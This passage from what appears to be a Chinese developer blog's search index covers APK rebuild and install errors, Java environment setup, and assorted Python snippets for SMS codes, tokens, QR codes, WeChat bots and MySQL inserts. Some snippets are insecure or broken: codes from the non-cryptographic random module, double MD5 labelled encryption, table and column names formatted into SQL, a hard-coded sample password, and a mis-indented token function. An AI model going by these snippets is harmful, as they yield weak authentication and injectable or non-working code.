</p>\n<ul>\n<li>失败：<br>W: AndroidManifest.xml:1: error: No resource identifier found for attribute ‘compileSdkVersion’ in package ‘android’<br>W: AndroidManifest.xml:1: error: No resource identifier found for attribute ‘compileSdkVersionCodename’ in package ‘android’</li>\n</ul>\n<p>解决方法：在AndroidManifest.xml中删除’compileSdkVersionCodename相关的。</p>\n<p>二、安装错误</p>\n<p>adb install -r SystemActivities.apk<br>Performing Streamed Install<br>adb: failed to install SystemActivities.apk: Failure [INSTALL_FAILED_OLDER_SDK: Failed parse during installPackageLI: /data/app/vmdl1716187195.tmp/base.apk (at Binary XML file line #0): Requires newer sdk version #28 (current version is #27)]</p>\n<p>解决方法：<br>用apkide打开后，找到 apktool.yml文件，将其中的sdk版本号降级：</p>\n<p>sdkInfo:<br>  minSdkVersion: ‘27’<br>  targetSdkVersion: ‘27’</p>\n<p>如果编译失败，则删除掉 AndroidManifest.xml 中的 sdkversion版本号 。</p>\n<h1 id=\"java环境变量-的配置与详解（全网最详细教程）\"><a href=\"#java环境变量-的配置与详解（全网最详细教程）\" class=\"headerlink\" title=\"java环境变量 的配置与详解（全网最详细教程）\"></a>java环境变量 的配置与详解（全网最详细教程）</h1><p>安装教程</p>\n<p> JDK的下载与安装<br>首先，百度直接搜索JDK，然后打开Oracle的jdk下载网页。（如果你比较懒 ，下方为链接）</p>\n<p><a href=\"https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html\">https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a></p>\n<p>接下来别忘记选择接受协议，然后打开系统设置面板检查所用电脑的系统位数。（64位 or 32位）</p>\n<p><img src=\"https://img-blog.csdn.net/20180911093003588?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></p>\n<p>如果为32位选择绿色剪头，如果为64位选择红色箭头。（如果是苹果电脑，请自行选择Mac选项）</p>\n<p><img src=\"https://img-blog.csdn.net/20180911083814475?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></p>\n<p>下载完成后打开安装包，点击下一步直到下图步骤。</p>\n<p><img src=\"https://img-blog.csdn.net/20180113024101426?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvanpwMTA4MzQ2MjE1NA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"img\"></p>\n<p>笔者推荐类似这种 语言的运行环境 装在C盘，如果C盘空间不足，或者比较介意请点击更改，选择你想要的路径（建议放在一个新建的空文件夹中）</p>\n<p>（此处为盗图，因为笔者的电脑都已经装了两套环境了，所以没有再次安装）</p>\n<p>注意：这个路径要记住，后面步骤要用到。</p>\n<p>然后继续点击下一步，直到下图步骤。（盗图）</p>\n<p><img src=\"https://img-blog.csdn.net/20180113024535783?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvanpwMTA4MzQ2MjE1NA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"img\"></p>\n<p>这里，如果上一步更改路径了，选择更改（注意：要和上一个保存在同一目录下）如果上一步没有更改，点击下一步。</p>\n<p>可能这里有人问，刚才不是选择过安装路径了吗？现在怎么又要选择？</p>\n<p>这里解释一下，可能细心的朋友已经发现了刚才选择路径时，默认路径是：C:\\Porgram File\\Java\\jdk1.8.0_181</p>\n<p>这里的默认路径是：C:\\Porgram File\\Java\\jre1.8.0_181</p>\n<p>也就是说刚才安装的是JDK(开发)，现在安装的是JRE(运行)，路径建议是将这两个安装到同一个目录下。也就是说，如果第一个路径选择的是：X:\\aaa\\bbb\\jdk1.8.0_181</p>\n<p>第二个安装路径最好是：X:\\aaa\\bbb\\jre1.8.0_181 这是为了便于环境变量值的书写方便。</p>\n<p>接下来点击下一步直到最后完成安装（盗图）</p>\n<p><img src=\"https://img-blog.csdn.net/20180113035037611?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvanpwMTA4MzQ2MjE1NA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"img\"></p>\n<p> 配置java环境变量<br>打开系统设置，点击高级程序设置</p>\n<p><img src=\"https://img-blog.csdn.net/20180911090451957?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></p>\n<p>然后点击环境变量</p>\n<p><img src=\"https://img-blog.csdn.net/20180911090553523?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></p>\n<p>打开环境变量界面以后 点击下方的新建（注意：下方系统变量的新建按钮）</p>\n<p><img src=\"https://img-blog.csdn.net/20180911090637852?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></p>\n<p>JAVA_HOME变量<br>新建JAVA_HOME变量（下方可复制）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">JAVA_HOME</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdn.net/20180911090929476?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></p>\n<p>点击浏览目录，找到你刚才安装时第一次更改的路径（未修改的默认路径为  C:\\Program Files\\Java\\jdk1.8.0_181 ）</p>\n<p>(我的安装比较早，所以图片上显示的是jdk1.8.0_161)</p>\n<p>然后点击确定。（注意：点击确定以后要检查一下，确保这个变量配置好了）</p>\n<p>Path变量<br>找到系统变量中的path变量，选中，点击编辑</p>\n<p><img src=\"https://img-blog.csdn.net/20180911103432658?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></p>\n<p>然后点击新建（下方可复制，此处跟前面路径无关）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">%JAVA_HOME%\\bin</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdn.net/20180911091220612?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></p>\n<p>继续点击新建，为了确保jre（运行）在你使用javaIDE的时候不产生问题，再新建一个变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">%JAVA_HOME%\\jre\\bin</span><br></pre></td></tr></table></figure>\n\n\n<p>再次注意：必须全是英文状态下的字符。</p>\n<p>点击确定，然后确定。打开path变量确认一下是否已经成功保存变量。</p>\n<p>ClassPath变量<br>方法和java-home一样，在初始界面点击新建（下方可复制）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ClassPath</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jar; </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdn.net/20180911111158980?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></p>\n<p>点击确认，然后 关闭，重新打开，确认一下是否已经成功安装。</p>\n<p>备注：目前笔者在查找比较确切的classpath变量环境的配置值。（网络上有各种版本）本文所用的配置值的依据底下有解释</p>\n<p>至此，大家一致认为的Java环境变量就配置完成了。你看懂了吗？</p>\n<p>classpath变量配置的解释<br>打开我的电脑中JDK的目录，找到以下文件；</p>\n<p><img src=\"https://img-blog.csdn.net/20180911091701163?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></p>\n<p><img src=\"https://img-blog.csdn.net/20180911091906430?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></p>\n<p>打开classpath变量所写的文件目录，发现如下文件。</p>\n<p><img src=\"https://img-blog.csdn.net/20180911091821782?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></p>\n<p>编辑，新建到系统变量的一系列值，其实，也就相当于告诉你的电脑，你新安装的某种编程语言运行环境在这里，你通过这里的配置把你的电脑引导到所需文件夹下。JAVA语言运行需要通过虚拟机，所以配置环境变量是为了JAVA文件运行时，引导它到你指定的文件夹运行虚拟机。</p>\n<p>所以，我的java环境classpath变量的配置值是正确的！</p>\n<p>java运行环境的验证<br>敲击键盘的Windows + R 按键，打开运行提示框，输入cmd（command简写，打开“小黑框”）</p>\n<p><img src=\"https://img-blog.csdn.net/20180911115106941?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></p>\n<p><img src=\"https://img-blog.csdn.net/20180911115248755?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></p>\n<p>输入java，验证java安装是否成功。</p>\n<p><img src=\"https://img-blog.csdn.net/20180911115340923?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></p>\n<p><img src=\"https://img-blog.csdn.net/20180911115404425?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></p>\n<p>输入javac</p>\n<p><img src=\"https://img-blog.csdn.net/20180911115450622?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></p>\n<p>点击回车 </p>\n<p><img src=\"https://img-blog.csdn.net/20181003175715407?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></p>\n<p>验证完毕！</p>\n","categories":["troubleshooting"],"tags":["问题排除记录"]},{"title":"python组件","url":"/2022/08/17/python%E7%BB%84%E4%BB%B6/","content":"<h1 id=\"python组件\"><a href=\"#python组件\" class=\"headerlink\" title=\"python组件\"></a>python组件</h1><h2 id=\"1-生成6位数字随机验证码\"><a href=\"#1-生成6位数字随机验证码\" class=\"headerlink\" title=\"1. 生成6位数字随机验证码\"></a>1. 生成6位数字随机验证码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">num_code</span>(<span class=\"params\">length=<span class=\"number\">6</span></span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    生成长度为length的数字随机验证码</span></span><br><span class=\"line\"><span class=\"string\">    :param length: 验证码长度</span></span><br><span class=\"line\"><span class=\"string\">    :return: 验证码</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>.join(random.choice(string.digits) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, length))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-md5加密\"><a href=\"#2-md5加密\" class=\"headerlink\" title=\"2.md5加密\"></a>2.md5加密</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span>  hashlib</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># md5加密</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">md5_encrypt</span>(<span class=\"params\">en_str</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    使用md5二次加密生成32位的字符串</span></span><br><span class=\"line\"><span class=\"string\">    :param en_str: 需要加密的字符串</span></span><br><span class=\"line\"><span class=\"string\">    :return: 加密后的字符串</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">   </span><br><span class=\"line\">    md5 = hashlib.md5()  <span class=\"comment\"># 使用MD5加密模式</span></span><br><span class=\"line\">    md5.update(en_str.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>))  <span class=\"comment\"># 将参数字符串传入</span></span><br><span class=\"line\">    md5.update(md5.hexdigest().encode(<span class=\"string\">&#x27;utf-8&#x27;</span>))  <span class=\"comment\"># md5二次加密</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> md5.hexdigest()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-生成唯一token\"><a href=\"#3-生成唯一token\" class=\"headerlink\" title=\"3. 生成唯一token\"></a>3. 生成唯一token</h2><pre><code>import uuid\nimport  hashlib\n\ndef only_token():\n    &quot;&quot;&quot;\n    使用md5加密uuid生成唯一的32位token\n    :return: 加密后的字符串\n    &quot;&quot;&quot;\nmd5 = hashlib.md5()  # 使用MD5加密模式\nmd5.update(str(uuid.uuid1()).encode(&#39;utf-8&#39;))  \nreturn md5.hexdigest()\n</code></pre>\n<h2 id=\"4、发送手机验证码\"><a href=\"#4、发送手机验证码\" class=\"headerlink\" title=\"4、发送手机验证码\"></a>4、发送手机验证码</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#验证码管理表</span><br><span class=\"line\">class AuthCode(models.Model):</span><br><span class=\"line\">    name = models.CharField(max_length=10,default=None, null=True, blank=True,verbose_name=&#x27;姓名&#x27;)</span><br><span class=\"line\">    phone = models.CharField(max_length=11, unique=True, verbose_name=&#x27;手机号&#x27;)</span><br><span class=\"line\">    code = models.CharField(max_length=6,verbose_name=&#x27;验证码&#x27;)</span><br><span class=\"line\">    purpose = models.IntegerField(default=0,verbose_name=&#x27;用途:0-&gt;注册验证 1-&gt;找回密码 2-&gt;其它&#x27;)</span><br><span class=\"line\">    sendNum = models.IntegerField(default=0,verbose_name=&#x27;发送次数&#x27;)</span><br><span class=\"line\">    isCanGet = models.BooleanField(default=0,verbose_name=&#x27;0-&gt;可以获取,1-&gt;不可以获取&#x27;)</span><br><span class=\"line\">    recentlySendTime = models.DateTimeField(auto_now_add=True,verbose_name=&#x27;最近一次发送时间&#x27;)</span><br><span class=\"line\">    creation_time = models.DateTimeField(auto_now=True, verbose_name=&#x27;创建时间&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    class Meta:</span><br><span class=\"line\">        verbose_name = &#x27;手机验证码&#x27;</span><br><span class=\"line\">        verbose_name_plural = verbose_name</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"实现逻辑\"><a href=\"#实现逻辑\" class=\"headerlink\" title=\"实现逻辑\"></a>实现逻辑</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import http.client</span><br><span class=\"line\">import urllib</span><br><span class=\"line\"># 使用互亿无线</span><br><span class=\"line\">host = &quot;106.ihuyi.com&quot;</span><br><span class=\"line\">sms_send_uri = &quot;/webservice/sms.php?method=Submit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 查看用户名 登录用户中心-&gt;验证码通知短信&gt;产品总览-&gt;API接口信息-&gt;APIID</span><br><span class=\"line\">account = &quot;你的用户名&quot;</span><br><span class=\"line\"># 查看密码 登录用户中心-&gt;验证码通知短信&gt;产品总览-&gt;API接口信息-&gt;APIKEY</span><br><span class=\"line\">password = &quot;你的密码&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def send_sms(text, mobile):</span><br><span class=\"line\">    text = f&quot;您的验证码是：&#123;text&#125;。请不要把验证码泄露给其他人。&quot;</span><br><span class=\"line\">    params = urllib.parse.urlencode(</span><br><span class=\"line\">        &#123;&#x27;account&#x27;: account, &#x27;password&#x27;: password, &#x27;content&#x27;: text, &#x27;mobile&#x27;: mobile, &#x27;format&#x27;: &#x27;json&#x27;&#125;)</span><br><span class=\"line\">    headers = &#123;&quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Accept&quot;: &quot;text/plain&quot;&#125;</span><br><span class=\"line\">    conn = http.client.HTTPConnection(host, port=80, timeout=30)</span><br><span class=\"line\">    conn.request(&quot;POST&quot;, sms_send_uri, params, headers)</span><br><span class=\"line\">    response = conn.getresponse()</span><br><span class=\"line\">    response_str = response.read()</span><br><span class=\"line\">    conn.close()</span><br><span class=\"line\">    return response_str</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    mobile = &quot;手机号&quot;</span><br><span class=\"line\">    text = &#x27;123122&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    print(json.loads(send_sms(text, mobile).decode(&#x27;utf-8&#x27;)))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"5、生成二维码\"><a href=\"#5、生成二维码\" class=\"headerlink\" title=\"5、生成二维码\"></a>5、生成二维码</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import qrcode</span><br><span class=\"line\">import io</span><br><span class=\"line\"></span><br><span class=\"line\">def maker_qrcode(url):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    生成二维码</span><br><span class=\"line\">    :param url: 需要生成二维码的url</span><br><span class=\"line\">    :return: 返回图片字节流</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    image = qrcode.make(url)  # 创建二维码片</span><br><span class=\"line\"></span><br><span class=\"line\">    buffer = io.BytesIO()</span><br><span class=\"line\">    # 将图片内容丢入容器</span><br><span class=\"line\">    image.save(buffer, &#x27;png&#x27;)</span><br><span class=\"line\">    # 返回容器内的字节</span><br><span class=\"line\">    return buffer.getvalue()</span><br><span class=\"line\">    </span><br><span class=\"line\">或者</span><br><span class=\"line\">from .settings import BASE_DIR</span><br><span class=\"line\"></span><br><span class=\"line\">def create_qrcode(name, url):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    生成机器扫码支付二维码</span><br><span class=\"line\">    :param name: 图片名称</span><br><span class=\"line\">    :param url: 支付路由</span><br><span class=\"line\">    :return:</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    img = qrcode.make(url, border=0)  # 创建二维码片</span><br><span class=\"line\">    save_path = BASE_DIR + &#x27;/&#x27; + name + &#x27;.png&#x27;</span><br><span class=\"line\">    print(save_path)</span><br><span class=\"line\">    img.save(save_path)</span><br><span class=\"line\">    return img</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"6-微信群发\"><a href=\"#6-微信群发\" class=\"headerlink\" title=\"6.微信群发\"></a>6.微信群发</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># coding=utf8</span><br><span class=\"line\">import itchat, time</span><br><span class=\"line\"></span><br><span class=\"line\">itchat.auto_login(True)</span><br><span class=\"line\"></span><br><span class=\"line\">SINCERE_WISH = u&#x27;祝%s新年快乐！&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">friendList = itchat.get_friends(update=True)[35:]</span><br><span class=\"line\">count = 0</span><br><span class=\"line\"></span><br><span class=\"line\">for  index,friend in enumerate(friendList):</span><br><span class=\"line\">    print(index,friend[&#x27;DisplayName&#x27;],friend[&#x27;NickName&#x27;])</span><br><span class=\"line\">    itchat.send(SINCERE_WISH % (friend[&#x27;DisplayName&#x27;]</span><br><span class=\"line\">                                or friend[&#x27;NickName&#x27;]), friend[&#x27;UserName&#x27;])</span><br><span class=\"line\">    time.sleep(2)</span><br><span class=\"line\">    print(&#x27;备注名称&#x27;,friend[&#x27;DisplayName&#x27;],&#x27;昵称&#x27;,friend[&#x27;NickName&#x27;],&#x27;用户名&#x27;,friend[&#x27;UserName&#x27;])</span><br><span class=\"line\"></span><br><span class=\"line\">print(&quot;----end----&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\"># 发送文本</span><br><span class=\"line\">itchat.send(&#x27;Hello, WeChat!&#x27;)</span><br><span class=\"line\"># 发送图片</span><br><span class=\"line\">itchat.send_image(&#x27;my_picture.png&#x27;)</span><br><span class=\"line\"># 发送视频</span><br><span class=\"line\">itchat.send_video(&#x27;my_video.mov&#x27;)</span><br><span class=\"line\"># 发送文件</span><br><span class=\"line\">itchat.send_file(&#x27;my_file.zip&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"7、微信自动回复\"><a href=\"#7、微信自动回复\" class=\"headerlink\" title=\"7、微信自动回复\"></a>7、微信自动回复</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># -*- coding=utf-8 -*-</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import itchat</span><br><span class=\"line\">import random</span><br><span class=\"line\">#图灵机器人</span><br><span class=\"line\">#http://www.tuling123.com/member/robot/1380138/center/frame.jhtml?page=0&amp;child=0获取apikey</span><br><span class=\"line\">KEY = &#x27;你的KEY&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">def get_response(msg):</span><br><span class=\"line\">    apiUrl = &#x27;http://www.tuling123.com/openapi/api&#x27;</span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">        &#x27;key&#x27;    : KEY,</span><br><span class=\"line\">        &#x27;info&#x27;   : msg,</span><br><span class=\"line\">        &#x27;userid&#x27; : &#x27;wechat-robot&#x27;,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        r = requests.post(apiUrl, data=data).json()</span><br><span class=\"line\">        return r.get(&#x27;text&#x27;)</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        return</span><br><span class=\"line\"></span><br><span class=\"line\">@itchat.msg_register(itchat.content.TEXT)</span><br><span class=\"line\">def tuling_reply(msg):</span><br><span class=\"line\">    defaultReply = &#x27;I received: &#x27; + msg[&#x27;Text&#x27;]</span><br><span class=\"line\">    robots=[&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;]</span><br><span class=\"line\">    reply = get_response(msg[&#x27;Text&#x27;])+random.choice(robots)</span><br><span class=\"line\">    return reply or defaultReply</span><br><span class=\"line\"></span><br><span class=\"line\">itchat.auto_login(enableCmdQR=False)</span><br><span class=\"line\">itchat.run()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"8、提取Django中model中的字段名变成字典、列表\"><a href=\"#8、提取Django中model中的字段名变成字典、列表\" class=\"headerlink\" title=\"8、提取Django中model中的字段名变成字典、列表\"></a>8、提取Django中model中的字段名变成字典、列表</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import re</span><br><span class=\"line\">t = &quot;&quot;&quot;</span><br><span class=\"line\">    goods_id = models.IntegerField(verbose_name=&#x27;商品编号&#x27;)</span><br><span class=\"line\">    label_code = models.CharField(max_length=20, verbose_name=&#x27;商品标签&#x27;)</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\"># 字典</span><br><span class=\"line\">print(&#123;k:None for k in re.findall(&#x27;([a-z_A-Z]+)\\s=\\s&#x27;,t)&#125;)</span><br><span class=\"line\"># 列表</span><br><span class=\"line\"># print([k for k in re.findall(&#x27;([a-z_A-Z]+)\\s=\\s&#x27;,t)])</span><br><span class=\"line\"></span><br><span class=\"line\">输出</span><br><span class=\"line\">&#123;&#x27;goods_id&#x27;: None, &#x27;lable_code&#x27;: None&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"9、数据库中给表创建数据\"><a href=\"#9、数据库中给表创建数据\" class=\"headerlink\" title=\"9、数据库中给表创建数据\"></a>9、数据库中给表创建数据</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import pymysql</span><br><span class=\"line\"></span><br><span class=\"line\">def createData(dataDict,tableName):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    给数据表创建数据</span><br><span class=\"line\">    :param dataDict: 字典</span><br><span class=\"line\">    :param tableName: 表名</span><br><span class=\"line\">    :return: </span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    #连接数据库</span><br><span class=\"line\">    conn = pymysql.connect(</span><br><span class=\"line\">        host=&#x27;192.168.0.188&#x27;, #数据库所在地址URL</span><br><span class=\"line\">        user=&#x27;root&#x27;, #用户名</span><br><span class=\"line\">        password=&#x27;123456&#x27;, #密码</span><br><span class=\"line\">        database=&#x27;名称&#x27;, #数据库名称</span><br><span class=\"line\">        port=3306,  #端口号</span><br><span class=\"line\">        charset=&#x27;utf8&#x27;</span><br><span class=\"line\">    )</span><br><span class=\"line\">    #拿到查询游标</span><br><span class=\"line\">    cursor = conn.cursor()</span><br><span class=\"line\">    clos,value = zip(*dataDict.items())</span><br><span class=\"line\">    sql = &quot;INSERT INTO `%s`(%s) VALUES (%s)&quot; % (tableName,</span><br><span class=\"line\">                                                &#x27;,&#x27;.join(clos),</span><br><span class=\"line\">                                                &#x27;,&#x27;.join([&#x27;%s&#x27;] * len(value))</span><br><span class=\"line\">                                                )</span><br><span class=\"line\">    print(sql)</span><br><span class=\"line\">    cursor.execute(sql, value)</span><br><span class=\"line\">    conn.commit()</span><br><span class=\"line\">    cursor.close()</span><br><span class=\"line\">    conn.close()</span><br><span class=\"line\">    print(&#x27;Done&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"10-捕捉异常\"><a href=\"#10-捕捉异常\" class=\"headerlink\" title=\"10.捕捉异常\"></a>10.捕捉异常</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">try:</span><br><span class=\"line\">    pass</span><br><span class=\"line\">except 异常类型 as e:</span><br><span class=\"line\">    pass</span><br><span class=\"line\">finally:</span><br><span class=\"line\">    pass</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">异常类型</span><br><span class=\"line\">Exception  全部异常</span><br><span class=\"line\">AttributeError 试图访问一个对象没有的属性，比如foo.x，但是foo没有属性x</span><br><span class=\"line\">IOError 输入/输出异常；基本上是无法打开文件</span><br><span class=\"line\">ImportError 无法引入模块或包；基本上是路径问题或名称错误</span><br><span class=\"line\">IndentationError 语法错误（的子类） ；代码没有正确对齐</span><br><span class=\"line\">IndexError 下标索引超出序列边界，比如当x只有三个元素，却试图访问x[5]</span><br><span class=\"line\">KeyError 试图访问字典里不存在的键</span><br><span class=\"line\">KeyboardInterrupt Ctrl+C被按下</span><br><span class=\"line\">NameError 使用一个还未被赋予对象的变量</span><br><span class=\"line\">SyntaxError Python代码非法，代码不能编译(个人认为这是语法错误，写错了）</span><br><span class=\"line\">TypeError 传入对象类型与要求的不符合</span><br><span class=\"line\">UnboundLocalError 试图访问一个还未被设置的局部变量，基本上是由于另有一个同名的全局变量，导致你以为正在访问它</span><br><span class=\"line\">ValueError 传入一个调用者不期望的值，即使值的类型是正确的</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"11、获取当前时间\"><a href=\"#11、获取当前时间\" class=\"headerlink\" title=\"11、获取当前时间\"></a>11、获取当前时间</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import datetime</span><br><span class=\"line\"></span><br><span class=\"line\">current_time = str(datetime.datetime.now())[:19]</span><br><span class=\"line\">print(current_time)</span><br><span class=\"line\"></span><br><span class=\"line\">输出格式如：2018-10-20 10:01:43</span><br><span class=\"line\">local_time = time.strftime(&#x27;%Y%m%d%H%M%S&#x27;, time.localtime(time.time()))</span><br><span class=\"line\">print(local_time)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"12、订单编号\"><a href=\"#12、订单编号\" 